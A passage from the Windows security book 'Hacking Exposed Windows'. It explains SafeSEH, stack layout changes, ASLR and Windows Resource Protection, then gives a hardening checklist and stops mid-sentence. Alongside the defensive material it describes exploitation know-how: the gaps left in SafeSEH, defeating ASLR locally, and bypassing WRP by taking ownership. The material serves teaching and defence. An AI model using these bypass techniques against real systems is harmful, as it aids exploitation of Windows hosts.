Windows  validates  that,  among other things, the handler articulated in the registration record exists in the safe  exception handler list. If not, the application is terminated. We can determine whether an   Figure 12-12  Exploiting SEH overwrites   Chapter 12:  Windows Security Features and Tools   395  executable has a set of safe exception handlers by running DUMPBIN with the LOADCONFIG option, as shown here: C:\tools>dumpbin  loadconfig c:\Windows\system32\calc.exe Microsoft  R  COFF PE Dumper Version 8.00.50727.42 Copyright  C  Microsoft Corporation.  All rights reserved.  Dump of file c:\Windows\system32\calc.exe File Type: EXECUTABLE IMAGE   Section contains the following load config:   ... 001780 Safe Exception Handler Table              5 Safe Exception Handler Count      Safe Exception Handler Table           Address           --------           01012AE2           01012D57           01012D84           01012DA4           01012DC4  From this, we can see that calc.exe has five safe exception handlers. When a userland  exception  occurs,  Windows  invokes  the  KiUserExceptionDispatcher  function  within ntdll.dll. If we trace this call path further, we will see that exception handler is  passed to RtlIsValidHandler. This function leans on RtlLookupFunctionTable and RtlCaptureImageExceptionValues  to  extract  the  safe  list  from  the  image.  RtlIsValidHandler  returns  a  true  or  false  depending  on  a  couple  conditions.  Ben  Nagy’s analysis of SafeSEH resulted in the following pseudocode that describes these  conditions in detail: if  SEHTable != NULL && SEHCount != 0  {       if  SEHTable == -1 && SEHCount == -1  {                Managed Code but no SEH Registration table                or IMAGE_LOAD_CONFIG.DllCharacteristics == 4             return FALSE;       }       if  &handler is registered  {             return TRUE;       else             return FALSE;       } }   396   Hacking Exposed Windows: Windows Security Secrets & Solutions      otherwise... if  &handler is on an NX page  {       if  DEP is turned on  {             bail STATUS_ACCESS_VIOLATION ;       else             return TRUE;       } } if  &handler is on a page mapped MEM_IMAGE  {    normally only true for executable modules       if  SEHTable == NULL && SEHCount == 0  {             return TRUE;                probably an old or 3rd party DLL                without SEH registrations       }       return FALSE    we should have caught this before                     so something is wrong. }    Handler is on a eXecutable page, but not in module space    Allow it for compatibility. return TRUE;  The  implications  of  these  checks  are  significant  from  an  exploitability  standpoint.  This  mechanism  removes  our  ability  to  bounce  off  pop,pop,ret  locations  within  loaded  images  that  contain  SEH  registrations  and  therefore  our  ability  to  gain  code  execution easily via an SEH overwrite. However, as Nagy points out, the door remains  slightly ajar. If the address is located outside of a loaded module and is marked executable,  the handler address is allowed.  SafeSEH Considerations A limitation of this design, as pointed out in Matt Miller’s  send this guy beer  excellent  paper “Preventing the Exploitation of SEH Overwrites,” is rooted in the fact that this  control is implemented at compile time instead of runtime. As such, legacy applications  and  third-party  software  may  not  be  protected.  In  his  paper,  Miller  describes  a  more  flexible  approach  to  solving  the  SEH  overwrite  problem  via  runtime  modifications.  Instead of relying on a list of safe exception handlers, Miller’s solution calls for adding a  custom  registration  record,  or  validation  frame,  to  the  end  of  the  ExceptionList during thread startup. Additionally, ntdll!KiUserExceptionDispatcher is hooked  to provide an opportunity to walk the ExceptionList and ensure that the validation  frame can be reached. If the validation frame can be reached, the solution assumes that  no SEH overwrite has occurred. If the validation frame cannot be reached, the solution  assumes  that  an  SEH  overwrite  has  occurred  and  prevents  further  execution.  This  behavior is founded on the following:     To obtain control via an SEH overwrite, the attacker must clobber the Handler.   Chapter 12:  Windows Security Features and Tools   397     If the Handler is clobbered, so, too, must be the Next attribute. This is because   the Next attribute is lower on the stack than the Handler.     If the Next attribute is clobbered, the ability to walk the ExceptionList to its   end is eliminated.  So what prevents an attacker from overwriting the Next attribute with the address  of the validation frame, provided he knows it? Nothing, really. However, if we recall  from earlier in this section, after execution returns from the pop,pop,ret sequence, it  lands at the location of the Next attribute. If an attacker attempts to fool Miller’s solution  by overwriting the Next attribute with the address of the validation frame, the process  will  crash  because  the  address  will  more  than  likely  represent  invalid  processor  instructions. If, by chance, the address converts to valid instructions, the possibility of  those instructions causing execution to jump to an attacker controlled location  before  running into the Handler  is slim. This solution, or any other for that matter, renders  arbitrary  code  execution  impossible.  It  does,  however,  greatly  reduce  the  efficacy  of  current SEH exploitation methods.  Stack Changes  It should be fairly apparent that stack layout plays a huge role in the exploitability of  various conditions. With this in mind, Microsoft made a few modifications to the stack  layout to reduce the probability of evil people doing bad things to your CPU. To this end,  the compiler shipped with Visual Studio 2005 has the ability to detect potentially sensitive  function arguments and place copies of them before local buffers—effectively getting  them  out  of  the  way  in  the  event  a  local  buffer  is  overrun.  Figures  12-13  and  12-14  illustrate this change.  Figure 12-13    Previous stack  Figure 12-14  arguments   Stack with protected    398   Hacking Exposed Windows: Windows Security Secrets & Solutions   Code  within  the  function  will  then  reference  the  copied  version.  This  reduces  an  attacker’s ability to overflow a local buffer and obtain control of the function’s arguments  that are used prior to the function returning. Additionally, according to Brandon Bray,  this will also protect against a scenario that may allow an attacker to abuse out parameters  to bypass GS checks by overwriting the value of the security cookie with a known value.  As you can see, this is a small but effective tweak that is raising the bar for attackers.  Address Space Layout Randomization  Previously,  we  touched  on  the  importance,  from  an  attacker’s  perspective,  of  having  some knowledge regarding the whereabouts of useful or controllable data. For example,  when we discussed SafeSEH, it became apparent that an attacker commonly relies on  knowing the location of useful instructions, such as pop, pop, ret, to pass execution to  his  exploit.  Public  attacks  against  Data  Execution  Protection   DEP ,  generic  return  address  overwrites,  and  so  on,  typically  depend  on  some  preconceptions  regarding  memory location. Heck, even the existence of the Metasploit opcode database and its  14,210,634 address mappings infers a certain degree of significance. So what happens if  we  are  able  to  strip  an  attacker  of  this  ally—this  ability  to  predict  where  in  memory  helpful instructions and controllable data are located? Would this be an end to remote  code  execution  exploits?  Would  all  vulnerabilities  be  categorized  as  merely  denial  of  service and the iDefense and 3Com bug bounties disappear? More than likely not, but it  would make life a lot more difficult for an attacker. And so this is what Microsoft did  with Vista; it took a page out of the UNIX world’s book and cooked up the ability to  randomize the location of where executable images  DLLs, EXEs, and so on , heap, and  stack allocations reside. Enrolling in ASLR Like the previously discussed safeguards in this section, ASLR is also enabled on a per- image basis via a build time parameter. In this case it’s a linker option,  DYNAMICBASE. Actually,  unless  you’ve  built  your  applications  with  the  linker  shipped  with  Visual  Studio 2005 SP1 or the Windows Driver Kit, your applications aren’t enrolled in ASLR.  This is because previous versions of link.exe do not support it  http:  support.microsoft  .com kb 922822 .  Unlike  GS  or  SafeSEH,  the  image  doesn’t  provide  Windows  with  much more than an indication that it’s willing to play along with ASLR. In fact, all this  linker  option  does  is  toggle  a  flag  in  the  DLLCharacteristics  attribute  of  the  application’s IMAGE_OPTIONAL_HEADER structure. This can be observed by executing  the following commands: c:\tools>link  EDIT  DYNAMICBASE:NO test.exe Microsoft  R  COFF PE Editor Version 8.00.50727.220 Copyright  C  Microsoft Corporation.  All rights reserved. c:\tools>dumpbin  headers  grep "DLL characteristics"                0 DLL characteristics c:\tools>link  EDIT  DYNAMICBASE test.exe Microsoft  R  COFF PE Editor Version 8.00.50727.220 Copyright  C  Microsoft Corporation.  All rights reserved.   Chapter 12:  Windows Security Features and Tools   399  c:\tools>dumpbin  headers  grep "DLL characteristics"               40 DLL characteristics Here we can see that the DLLCharacteristics flags have been updated from 0 to  0x40 when we enabled the  DYNAMICBASE option. If we jump over to MSDN, we can  learn the meaning of this value: IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE 0x0040  THE DLL can be relocated  at load time.  And there we have it.  You should take a couple of things away from this. First, ASLR is an opt-in security  linked  their  applications  mechanism,  meaning  unless  your  software  vendors  appropriately, it may not be as effective as ASLR for that process. Second, we can easily  determine which applications and DLLs have or have not opted in to ASLR by simply  inspecting  the  DLLCharacteristics  attribute.  A  quick  scan  of  the  C:\Windows\ System32 directory on a slightly used Vista Ultimate system showed that 1676 of 1767  exe dll files enrolled in ASLR. ASLR Considerations When Vista reboots, the system selects one of 256 64KB-aligned addresses in which to  start loading ASLR enrolled images. As such, the address of these images will remain  constant across processes until the system is rebooted. A caveat to this is all processes  using a given image have unloaded it. In this scenario, when the image is loaded back  into memory, it may be loaded at a different address.  So what are the implications of all this? From a remote attacker’s perspective, ASLR  remains effective as the remote attacker has  in most cases  no way to determine the load  address of images. However, a local attacker can derive the addresses of useful DLLs by  attaching a debugger to one of the attacker’s own processes. Because the load address of  DLLs is fairly constant across processes, the probability of the same DLL being loaded at  the same location within a privileged process is high. As such, the efficacy of ASLR on  the local landscape is fairly reduced. To be fair, ASLR was not designed to protect against  local attacks. Matt Miller suggested that processes of differing privilege levels should  utilize  different  address  mappings.  This  may  help  reduce  a  local  attacker’s  ability  to  exploit highly privileged applications successfully because the attacker would no longer  know the address of useful instructions.  WINDOWS RESOURCE PROTECTION  Like Windows 2000 and Windows XP, Windows Vista comes equipped with a mechanism  to protect critical system resources: it’s called Windows Resource Protection  WRP . Like  its ancestor, Windows File Protection  WFP , WRP attempts to ensure that critical files  are  not  intentionally  or  unintentionally  modified.  However,  WRP  takes  this  one  step  further by protecting Registry values as well.  Like WFP, WRP stashes away copies of files that are critical to system stability. The  location, however, has moved from %SystemRoot%\System32\dllcache to %Windir%\   400   Hacking Exposed Windows: Windows Security Secrets & Solutions   WinSxS\Backup, and the mechanism for protecting these files has also changed a bit.  There is no longer a System File Protection thread running to detect modifications to  critical files. Instead, WRP relies on Access Control Lists  ACLs . As such, it should be no  surprise that WRP is always enabled.  Under  WRP,  the  ability  to  write  to  a  protected  resource  is  granted  only  to  the  TrustedInstaller principal—this excludes Administrators as well. This can be observed in  Figures 12-15 and 12-16.  Like other discretionary ACLs, those supporting WRP can be modified as well. In a  moment we will discuss how they can be modified to allow the replacement of WRP- protected resources. In the absence of these modifications, only the following actions can  replace a WRP-protected resource:     Windows Update installed by TrustedInstaller    Windows Service Packs installed by TrustedInstaller    Hotﬁ xes installed by TrustedInstaller    Operating system upgrades installed by TrustedInstaller  Figure 12-15  Administrators lacking Write privilege   Chapter 12:  Windows Security Features and Tools   401  Figure 12-16  TrustedInstaller with Full Control  As  previously  mentioned,  workarounds  for  WRP  exist.  By  default,  the  local  Administrators  group  has  the  SeTakeOwnership  right,  as  shown  under  User  Rights  Assignment within the Local Security Policy  Figure 12-17 .  With this privilege, a principal can take ownership of the WRP-protected resource. At  this point, permissions applied to the protected resource can be changed arbitrarily by  the owner, and the resource can be modified, replaced, or deleted.  Remember that WRP isn’t designed to be an end-all security feature. The primary  purpose for this technology is to prevent third-party installers from modifying resources  that are critical to the OS’s stability. One of the benefits of knowing how to disable WRP  is  to  make  life  easier  when  you’re  reverse-engineering  or  instrumenting  a  process.  Depending on what you’re after, you may want to alter the process’s behavior. To do this,  you have two primary choices: patch the process during runtime or patch the .dll or .exe  on disk. The former requires you to apply the patch every time the process executes, the  latter is a one-time shot.   402   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 12-17  Administrators group with SeTakeOwnership privilege  SUMMARY  The issues covered in this chapter underlie the core countermeasures to the many attacks  discussed in this book. Hopefully, this brief coverage has helped give you a bird’s-eye  view of how these measures can be leveraged most effectively to defend against malicious  hackers of all levels of sophistication.

It is neither a blow-by-blow  reiteration  of  the  preceding  pages  nor  a  comprehensive  recitation  of  every  security- relevant setting available on Windows 2000 and later. Nevertheless, we think it covers  100 percent of the important things you need to consider regarding NT family security,  based on our combined years of experience. The goal here—as it has been throughout  the book—is not to achieve perfect security, but rather to decrease the burden on system  administrators, while raising the bar for potential attackers.  CAVEAT EMPTOR: ROLES AND RESPONSIBILITIES  The most difficult thing about building a generic Windows security checklist is accounting  for the many roles that the OS can play on a network. It can act as a stand-alone computer,  a member of a domain, a domain controller, a web server, a Terminal Services Application  Server, a file and print server, a firewall, and uncountable other roles and combinations. The recommendations made in this checklist are quite restrictive, and they may not  be  appropriate  for  the  role  Windows  plays  in  your  environment.  Where  possible,  we  have  noted  certain  restrictive  configurations  that  will  inhibit  specific  functionality;  ultimately, you will have to be the judge of the effectiveness of these recommendations  after thoroughly testing them in your own environment.  This being said, we think the most restrictive recommendations should always be  followed  unless  a  convincing  business  case  can  be  made  to  relax  them.  Use  good  judgment.  One final word on the topic of system roles: security best practices dictate that systems  should  be  single-purposed  whenever  possible.  We  recognize  that  the  constraints  of  budgets  and  time  don’t  always  make  this  feasible,  but  with  the  price  of  hardware  nowadays,  plus  the  existence  of  virtualization  technology,  we  think  keeping  systems  single-purposed  is  well  worth  the  small  additional  expenditure  to  reduce  the  attack  surface of the network.  PREINSTALLATION CONSIDERATIONS  Windows security starts even before the OS is installed. Here’s what you need to consider  before you remove the shrink-wrap from the CD-ROM:     Ensure that inappropriate information about the system and its administrators   cannot be found in Internet Registry databases available via whois and that  dial-up access numbers are not published inappropriately.     Make sure that the system is protected by a network security device  such as a  ﬁ rewall  that is conﬁ gured to limit access to the system on only those ports that  are necessary for it to serve its role. Put more plainly, block all communications  that are not speciﬁ cally permitted.   Appendix A:  Windows Security Checklist   407     Implement features on surrounding network devices designed to inhibit the  impact of denial of service attacks  see Hacking Exposed 5th Edition for more  information on DoS .     Install Windows cleanly; upgrading from prior versions can introduce weak   permissions on ﬁ le and Registry keys, so we do not recommend it. For automated  installs, pay strict attention to the integrity of the networked source ﬁ les.     Ensure that the system is physically secured  see Chapter 11 for more details .  Don’t forget to consider proximity to wireless communications such as 802.11x  and Bluetooth.     Set a BIOS password if possible, including one speciﬁ c to any hard drives in the   system if your system hardware vendor implements ATA-3 and later.     Set BIOS Boot Sequence to hard disk only; do not permit boot using a ﬂ oppy   or CD-ROM.     Consider physically uninstalling removable media drives such as ﬂ oppy   disks or CD-ROM drives that could be used to boot the system to an  alternative OS.     Create at least two NTFS partitions: one for the system  C: , and one for data    we’ll refer to this as the E: partition in this checklist . This is especially important  with Vista and BitLocker Drive Encryption—setting the partitions right the ﬁ rst  time saves a ton of effort.     Do not install unnecessary networking protocols.  BASIC WINDOWS HARDENING  Following are the basic steps to hardening a Windows 2000 and later system for a generic  role.  Our  recommendations  are  broken  into  two  parts:  steps  that  must  be  performed  manually,  and  those  that  can  be  performed  via  a  Security  Template   http:  support  .microsoft.com kb 816585 . Recall that custom Security Templates can be designed to  configure features that are not listed in the standard templates that ship with Windows,  but you must directly edit the .INF files to do this.  Non-Template Recommendations  These recommendations are not easily implemented using Security Templates:     Set SYSKEY in password- or ﬂ oppy-protected mode  type Run…SYSKEY and   set the appropriate mode . Store the password or ﬂ oppy in a secure place.    Windows 2000 and earlier only: Disable the storage of the LAN Manager hash in  the Security Agents Monitor  SAM  by creating the following Registry key  not  a value! : HKLM\SYSTEM\CurrentControlSet\Control\Lsa\NoLmHash   408   Hacking Exposed Windows: Windows Security Secrets & Solutions   This is not supported by Microsoft and may break applications. This setting is available in Windows XP  and later via Security Policy, and it should be configured there if available.     If you are using IIS, move the IIS virtual roots  C:\Inetpub, and so on  to a   second NTFS partition  E: . Use the ROBOCOPY Robust File Copy tool from the  Reskit with the  SEC  MOVE switches to preserve NTFS ACLs on directories  and ﬁ les  otherwise, permissions will be reset to Everyone:Full Control on the  destination .     Verify that any system vendor-installed drivers or applications do not introduce   security risks.  For example, the Compaq Insight Manager service that comes  preinstalled on many Compaq machines had a known ﬁ le disclosure vulnerability  in early versions.      If they are not needed, disable NetBIOS & SMB services  TCP UDP 135–139 and  445  by disabling File and Print Sharing for Microsoft networks, as discussed in  Chapter 4. This will prevent use of the system as a ﬁ le and print server, and it  may cause issues with NetBIOS name resolution. Neither ﬁ le and print services  nor NetBIOS name resolution is important for typical web servers.  Disabling these and other services can be accomplished through Group Policy.     Lock out the true Administrator account using passprop from the Reskit    requires Windows 2000 Service Pack 2 or later .     Rename the true Administrator, and create a decoy Administrator account that   is not a member of any group. This can be done via Security Policy on Windows  XP and later.     Carefully scrutinize employees who require administrative privileges, and   ensure that proper policies are in place to limit their access beyond their term  of employment.     On all Windows 9x systems in your environment, implement LAN Manager  Authentication Level equal to 3 using the DSClient update from the Support  Tools  see KB article Q239869 . This is also referred to as LMCompatibility level.    Install an antimalware application, keep the signature database updated, and   scan the system regularly.     Create an Emergency Repair Disk  ERD  using Run…ntbackup, label it, and   store it safely.  Apply the Most Recent Service Packs and Hotﬁ xes Applying the most recent service packs and hotfixes from Microsoft for the operating  system and all applications  Internet Explorer, SQL Server, and so on  is perhaps one of  the most important steps you can take to secure Windows.  The greatest security risk comes from vulnerabilities that are widely published and  generally  addressed  by  a  security  bulletin  and or  patch  from  Microsoft.  Since  such    Appendix A:  Windows Security Checklist   409  vulnerabilities are so widely known, and the Internet community typically distributes  exploit code for such issues with prompt regularity, they represent the highest risk to  your Windows deployment. It is thus imperative that you apply the patches for these  vulnerabilities.  For  enterprise-class  organizations,  we  recommend  using  Microsoft’s  SMS  with  the  Software Update Services  SUS  Feature Pack. For smaller organizations, use SUS in stand- alone mode  free from www.microsoft.com . For manual inventory of patches, use Microsoft  Baseline Security Analyzer  or a tool such as srvinfo from the Reskit . We also recommend  good third-party patch management tools such as HFNetChk Pro from Shavlik.  Finally, slipstreaming patches service packs into source builds is an important tool   to improve efficiency for subsequent builds to avoid lengthy patching times.  Service Accounts and LSA Secrets If you are deploying the system into a Windows domain, remember the lessons of the  LSA Secrets cache discussed in Chapter 7. If domain accounts are configured to log on to  the  local  system  to  start  services,  the  passwords  for  those  domain  accounts  can  be  revealed in cleartext by Administrator-equivalent users  including attackers . This attack  will even reveal passwords for accounts from domains trusted by the one in which the  system is deployed. We thus strongly recommend against allowing services to start in  the context of domain accounts. If you must, use a domain account with very restricted  privileges—remember that every local Administrator on every machine in the domain or  trusting domains where this account is deployed to log on as a service will essentially be  able to grab the cleartext password with ease!  Security Templates Recommendations  The following recommendations can be set using Security Templates. By design of the  in-the-box  Security  Templates  that  ship  with  Windows,  they  should  be  applied  in  sequence. Depending on your environment, the last template that should be applied is  the hisecws template, which can be applied as follows  must be in %windir%\security\ templates : secedit  configure  cfg hisecws.inf  db hisecws.sdb  log hisecws.log  verbose  The hisecws template may not be stringent enough for your system. Following are  our amplifications and modifications to settings that can be set using Security Templates,  as summarized from the many chapters in this book. We have listed additional, even  more comprehensive, templates produced by third parties at the end of this appendix.  Disable any other unnecessary services. The only services required on Windows 2000   and later are the following:     DNS Client    Event Log    Logical Disk Manager    Plug & Play   410   Hacking Exposed Windows: Windows Security Secrets & Solutions   These additional services are not required but may be needed to implement some of   the other recommendations in this checklist:  A domain controller additionally requires the following:     DNS server  unless a DNS server that supports dynamic updates is already      Protected Storage    Security Accounts Manager     IPSec Policy Agent    Network Connections Manager    Remote Procedure Call    Remote Registry Service    RunAs Service  available      File Replication Service  if greater than one DC     Kerberos Key Distribution Center    NetLogon    NT LM Service Provider    RPC Locator    Windows Time    TCP IP NetBIOS helper    Server  when sharing resources or running AD     Workstation  when connecting to resources   In addition, follow these steps:     Set stronger ACLs on administrative tools, and delete or move them if   necessary. Set executable ﬁ les in %systemroot%\system32 to Everyone:Read,  Administrators:Full, SYSTEM:Full.     Enforce strong passwords using Security Policy\Account Policies\Passwords   Must Meet Complexity Requirements.     Enable account lockout using Security Policy\Account Policies\Account   Lockout Policy.     If access to SMB services is permitted, set RestrictAnonymous=2 on Windows   2000.  This is called Additional Restrictions For Anonymous Connections in  Security Policy; see KB articles Q143474 and Q246261.  For Windows XP and  later, use the appropriate settings in Security Policy under the Network Access  headers.  See Chapter 4 for a full discussion of these recommendations.      Set the LAN Manager Authentication Level to at least 3 on all systems in your   environment, especially legacy systems such as Windows 9x, which can    Appendix A:  Windows Security Checklist   411  implement LMAuthentication Level 3 using the DSClient update from the  Windows 2000 Support Tools.    Restrict interactive logon to the most trusted user accounts only!    Admins should thoroughly evaluate Software Restriction Policies  SRP  as a   means of limiting what executables are run on their managed servers desktops.  Auditing Although  not  a  preventative  measure,  enabling  auditing  is  critical  for  high-security  systems so that attacks can be identified and proactive steps can be taken.     Enable auditing of Success Failure for all events under Security Policy\Audit  Policy, except for Process Tracking. Review the logs frequently.  Use automated  log analysis and reporting tools as warranted.      Conﬁ gure speciﬁ c objects for auditing as required—remember that the Audit   Object Access setting under Audit Policy only enables the potential for auditing  speciﬁ c object access; it does not conﬁ gure it globally for all objects  as some  might think .     Check the audit logs frequently for Auditing Disabled events. This is a sign that  someone is trying to cover the tracks of an intrusion, especially if performed by  the SYSTEM account.     Transactional log aggregation is really the only way to assure log integrity.  Microsoft Operations Manager  MOM  v3 and some third-party tools have  this feature.  Windows Firewall and IPSec  Because  of  its  ability  to  selectively  block  network  traffic  from  reaching  a  system,  the  Windows Firewall makes a great all-around addition to any security checklist. Starting  with  Windows  Vista,  Windows  Firewall  can  be  managed  via  Group  Policy,  supports  outbound filtering, and also integrates management of IPSec rules, so it can be managed  across the enterprise to implement a comprehensive Windows communication security  program.  Technically, Group Policy templates were available for the Firewall in XP SP2,  but complete integration is available in Vista.   Speaking  of  IPSec,  don’t  forget  that  IPSec  rules  offer  some  additional  properties  beyond  Windows  Firewall,  primarily  the  ability  to  specify  the  type  of  protocol  and  authentication that must be enforced for specific machines to communicate. This enables  virtual segmentation of large networks into IPSec-protected zones.  If you implement IPSec filters to protect your servers, make sure that you check the   following Registry value: HKLM\SYSTEM\CurrentControlSet\Services\IPSEC\NoDefaultExempt, REG_DWORD=1  In Windows 2000’s default state, this value does not exist, and IPSec filters by default  exempt certain types of traffic from filtering  see KB article Q253169 . This gives attackers  an opening through which to bypass IPSec filters entirely. Setting NoDefaultExempt=1    412   Hacking Exposed Windows: Windows Security Secrets & Solutions   narrows the window significantly by removing the exemption for Kerberos and RSVP  traffic. You will manually have to set up specific filters for Kerberos traffic if you need to  allow  it.  This  Registry  value  will  not  block  broadcast,  multicast,  or  IKE  traffic,  so  be  aware that IPSec filters are not airtight protection.  On Windows Server 2003, additional values are implemented, and the default setting  is 3. You can use the netsh tool to fiddle with this setting, but why mess with the most  secure if it is the default?  Just to reiterate, set the NoDefault Exempt Registry key to 1 when using IPSec filters on Windows  2000, and set it to 3 on Windows Server 2003  the default , or your filters will provide significantly  reduced security.  We’ve  found  that  IPSec  is  often  poorly  understood,  especially  the  difference  between  functional  modes,  Filtering,  Authentication,  and  Encryption.  Check  out  www.microsoft.com technet network  ipsec default.mspx for complete information.  Group Policy  Group Policy is one of the key features underlying the Windows domain security model.  With Group Policy, you can import Security Templates and push them out to an entire  Active Directory site, domain, or organizational unit  OU . Even better, Group Policy can  include  Windows  Firewall IPSec  rules,  so  restrictive  communications  settings  can  be  pushed out this way as well. We won’t go into detail in this short checklist on how to use  Group Policy to its full potential, but direct the reader to http:  en.wikipedia.org wiki  Group_Policy.  Miscellaneous Conﬁ gurations  Following are a few settings that apply only to situations in which the system fulfills a  specific role, such as a domain controller, or systems that have specific services enabled,  such as SNMP. Domain Controllers     Pay special attention to the physical security of domain controllers. They hold  account information for everyone on the domain! And if they serve as part of a  PKI implementation, they also have the root keys!     Conﬁ gure Windows DNS servers to restrict zone transfers to explicitly deﬁ ned   hosts, or disable zone transfers entirely  which is done by default starting in  Windows Server 2003 .     Carefully restrict untrusted access to the Active Directory–speciﬁ c services,   TCP UDP 389 and 3268. Use network ﬁ rewalls, Windows Firewall IPSec ﬁ lters,  or any other mechanism available.     Remove the Everyone identity from the pre–Windows 2000 Compatible Access  on domain controllers if possible. This is a backward-compatibility mode that    Appendix A:  Windows Security Checklist   413  allows NT RAS and SQL services to access user objects in the directory. If you  don’t require this legacy compatibility, turn it off. Plan your migration to Active  Directory such that RAS and SQL servers are upgraded ﬁ rst, so that you do not  need to run in backward-compatibility mode  see KB article Q240855 .  SNMP     If you must enable SNMP  and we recommend against it , block untrusted   access to the SNMP Service. You can conﬁ gure the Windows SNMP Service to  restrict access to explicitly deﬁ ned IP addresses, as shown in Chapter 4.  You  can also use the Windows Firewall for this, of course, or IPsec to encrypt and  authenticate SNMP trafﬁ c.      Set complex, non-default community names for SNMP services if you use them!    If you must use SNMP on Windows machines, set the appropriate ACLs on HKLM\System\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities    Also, delete the LAN Manager MIB under  HKLM\System\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents  Delete the value that contains the LANManagerMIB2Agent string, and then  rename the remaining entries to update the sequence.      WEB APPLICATION SECURITY CONSIDERATIONS  Running a web application on Windows changes the security requirements dramatically.  By  design,  the  system  will  be  connected  to  the  most  hostile  of  public  networks—the  Internet. Thus, no amount of under-preparation is acceptable.  From the platform perspective, given that Windows has already been selected as the  operating system, most people will choose to implement their web application on IIS.  Thankfully, the IIS product development team at Microsoft has learned over many years  of being the hacking community’s whipping post how to build a hardened web server  implementation. Thus, our best advice to anyone implementing IIS is to upgrade to IIS  version  6  or  greater.  Version  6  accumulates  all  of  the  best  security  features  and  fixes  implemented over the years  such as the excellent URLScan URL firewall  out of the box,  requiring minimal configuration.  For those of you old-school IIS 4 and 5 diehards, read the Microsoft IIS 4 Security Checklist and or  the Secure Internet Information Services 5 Checklist. And remember that all this stuff is done for you  on IIS 6 and later!  The Center for Internet Security offers an Apache Web Server Security Benchmark at cisecurity.org.  Of course, no amount of platform configuration will save you from an application- level attack. Even if you implement every item in this checklist exactly, you will still need    414   Hacking Exposed Windows: Windows Security Secrets & Solutions   to  invest  appropriate  resources  into  developing  your  web  application  securely.  All  of  the  countermeasures described here won’t do a thing to stop an intruder who enters your  website as a “legitimate” anonymous or authorized user. At the application level, all it  takes is one bad assumption in the logic of your site design, and all the careful steps you’ve  taken to harden Windows and IIS will be for naught. Don’t hesitate to bring in outside  expertise if your web development team isn’t security-savvy, and certainly plan to have an  unbiased third party evaluate the design and implementation as early in the development  life cycle as possible. Remember: assume all input is malicious, and validate it!  SQL SERVER SECURITY CONSIDERATIONS  Here  are  our  recommended  SQL  Server  security  configurations  summarized  from  Chapter 9  with redundant entries removed :     Upgrade to SQL Server 2005 or later! And stay current on SQL Server service packs.    Implement appropriate network access control to isolate SQL Server; SQL  servers should have direct connectivity only to the machines that will be  requesting their services. For example, if SQL Server is the data store for your  web-based storefront, no machines other than the web servers should have  direct connectivity to SQL Server.     Carefully consider SQL Server security mode settings. While using Windows  authentication for SQL Server may seem to be a more secure option, it is not  always feasible in certain environments. Take the time to evaluate whether  you can use it, and if so, change the SQL login mode so that users cannot  log in using name password pairs. This will also free you from having to  include these credentials in connection strings or embed them in client server  applications. If you do use Mixed Mode authentication, create an equivalent  credential management system to ensure that passwords meet policy criteria  and are regularly changed.     Enable SQL Server Authentication Logging. By default, authentication logging   is disabled in SQL Server. You can remedy this situation with a single command,  and it is recommended that you do so immediately. Either use the Enterprise  Manager and look under Server Properties in the Security tab, or issue the  following command to the SQL Server using Query Analyzer or osql.exe   the following is one command line-wrapped due to page-width constraints : Master..xp_instance_regwrite N'HKEY_LOCAL_MACHINE',  N'SOFTWARE\Microsoft\MSSQLServer\MSSQLServer',N'AuditLevel', REG_DWORD,3     Encrypt data when possible. SQL Server 2005 introduced the native encryption   infrastructure to help achieve this. Prior to SQL 2005, no native support is  provided for encrypting individual ﬁ elds; however, you can easily implement  your own encryption using Microsoft’s Crypto API and then place the encrypted  data into your database. More third-party solutions are listed at the end of  Chapter 9; these can encrypt SQL Server data by adding functionality to the  SQL server via extended stored procedures  use these at your own risk .   Appendix A:  Windows Security Checklist   415     Use the Principle of Least Privilege. Why is it that so many production applications   are running as the sa account or a user with database owner privileges? Take  the time during installation of your application to create a low-privilege account  for the purposes of day-to-day connectivity. It may take a little longer to itemize  and grant permissions to all necessary objects, but your efforts will be rewarded  when someone does hijack your application and hits a brick wall from insufﬁ cient  rights to take advantage of the situation.     Don’t run SQL in the context of a privileged user account. Take the time to   create a unique user account  not an Administrator  and enter the user’s  credentials during installation. This will restrict users who execute extended  stored procedures as a system administrator from immediately becoming  domain or local operating system administrators, or the system account   LocalSystem .     Perform thorough input validation. Never trust that the information being sent  back from the client is acceptable. Client-side validation can be bypassed, so  your JavaScript code will not protect you. The only way to be sure that data  posted from a client is not going to cause problems with your application is to  validate it properly. Validation doesn’t need to be complicated. If a data ﬁ eld  should contain a number, verify that the user entered a number and that it is  in an acceptable range. If the data ﬁ eld is alphanumeric, make sure the length  and content of the input is acceptable. Regular expressions are a great tool for  checking input for invalid characters, even when the formats are complex, such  as in e-mail addresses, passwords, and IP addresses.     Use stored procedures—wisely. Stored procedures give your applications a  one-two punch of added performance and security. This is because stored  procedures precompile SQL commands, parameterize  and strongly type  input,  and allow the developer to provide execute access to the procedure without  providing direct access to the objects referenced in the procedure. The most  common mistake made when implementing stored procedures is to execute  them by building a string of commands and sending the string off to SQL  Server. If you implement stored procedures, take the time to execute them using  the ADO Command objects so that you can properly populate each parameter  without the possibility of someone injecting code into your command string.  And remember to remove powerful stored procedures such as xp_cmdshell  entirely. Chapter 9 lists XPs that should be removed.  Removing or restricting access to built-in extended stored procedures may put SQL Server in an  unsupported state. Contact your support representative at Microsoft to verify.     Use SQL Proﬁ ler to identify weak spots. One excellent technique for ﬁ nding  SQL injection holes is constantly to inject an exploit string into ﬁ elds in your  application while running SQL Proﬁ ler and monitoring what the server is  seeing. To make this task easier, it helps to use a ﬁ lter on the TextData ﬁ eld  in SQL Proﬁ ler that matches your exploit string. See Chapter 9 for examples.   416   Hacking Exposed Windows: Windows Security Secrets & Solutions      Use alerts to monitor potential malicious activity. By implementing alerts on key   SQL Server events  such as failed logins , it is possible to alert administrators  that something may be awry. An example is to create an alert on event IDs 18456   failed login attempt , which contain the text ‘sa’  include the quotes so the alert  doesn’t ﬁ re every time the user “Lisa” logs in, for example . This would allow an  administrator to be alerted each time a failed attempt by someone to access the  SQL Server as sa occurs and could be an indication that a brute-force attack is  taking place.  TERMINAL SERVER SECURITY CONSIDERATIONS  Here are some considerations gathered from throughout the book.     Consider reassigning the default Terminal Server  TS  service port by modifying   the following Registry key: HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp Value : PortNumber REG_DWORD=3389    Set up a custom Remote Desktop Connection document  .rdp  to conﬁ gure   clients to connect to the custom port, or use port redirection on the client.  The ActiveX TS client cannot be used to connect to a modiﬁ ed port.     Implement a custom 